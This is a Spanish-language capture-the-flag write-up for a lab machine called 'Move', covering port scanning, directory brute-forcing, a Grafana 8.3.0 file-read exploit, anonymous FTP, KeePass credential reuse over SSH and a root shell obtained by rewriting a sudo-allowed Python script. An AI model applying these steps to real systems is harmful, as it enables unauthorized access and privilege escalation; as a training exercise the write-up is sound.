Maquina: Move

Autor: El Pinguino de Mario

Dificultad: Facil

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

ping 172.17.0.2 -c 1

despues scaneamos con nmap un escaneo de puertos y servicios detallado

nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts

el puerto 22 perteneciente al servicio SSH y el puerto 80 perteneciente al servicio HTTP y el puerto 3000 están abiertos

volvemos a scanear con nmap para obtener más información sobre ese puerto específicamente.

sudo nmap -sCV -p22,80,3000 -v 172.17.0.2

El puerto 80 y el 3000 podemos encontrar servicios web y en el 3000 nos aparece una redirección a un panel de Login. 

buscamos directorios con la herramienta Gobuster

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml,js -u http://172.17.0.2

Encontramos un archivo /maintenance.html

Hemos encontrado un encabezado en HTML que revela la ruta de un archivo potencialmente interesante, aunque actualmente no tenemos acceso al sistema para explorarlo más a fondo. Guardaremos esta información para usarla mas adelante.

enumeramos del puerto 3000

Hemos encontrado un panel de inicio de sesión de Grafana. Lo más notable es que en la parte inferior del panel se muestra la versión específica del servicio.

la versión específica de Grafana que encontramos es vulnerable a un exploit que permite la lectura de archivos en el sistema.

searchsploit grafana 8.3.0

python3 exploit.py -H http://172.17.0.2:3000

leemos el archivo /tmp/pass.txt

nos conectamos por ftp con anonymous

ftp 172.17.0.2

Vemos que hay un archivo kdbx que es un archivo de Keepass, al momento de abrirlo vemos que nos pide una contraseña vamos a probar la que encontramos en el directorio /tmp.

Vamos a conectarnos vía SSH con el usuario y contraseña del KeePass

ssh freddy@172.17.0.2

Si hacemos un sudo -l nos aparece lo siguiente

Como podemos ejecutar el script mantienance.py como root lo que podemos hacer es modificar el script y hacer que al ejecutar spawnee una bash como root de la siguiente forma

nano maintenance.py

import os
os.system("/bin/sh")

ejecutamos el archivo

sudo /usr/bin/python3 /opt/maintenance.py

whoami
